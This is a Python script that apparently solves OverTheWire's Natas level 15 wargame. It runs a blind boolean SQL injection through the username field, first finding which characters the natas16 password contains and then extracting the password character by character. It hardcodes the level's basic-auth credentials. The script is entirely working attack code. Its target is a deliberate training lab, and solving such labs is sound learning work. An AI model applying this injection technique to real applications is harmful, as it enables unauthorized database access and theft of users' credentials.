from requests import post
from requests.auth import HTTPBasicAuth
import string

url = "http://natas15.natas.labs.overthewire.org/index.php?debug"

possbile_characters = string.ascii_letters + string.digits
characters_used = ""
password = ""

for char in possbile_characters:
  r = post(
    url=url,
    data={
      'username': f'natas16" AND password LIKE BINARY "%{char}%" #',
    },
    auth=HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')
  )
  if 'exists' in r.text:
    characters_used += char


for i in range(0, 32):
  for char in characters_used:
    r = post(
      url=url,
      data={
        'username': f'natas16\" and password LIKE BINARY "{password + char}%" #',
      },
      auth=HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')
    )
    if 'exists' in r.text:
      password += char
      break
print(password)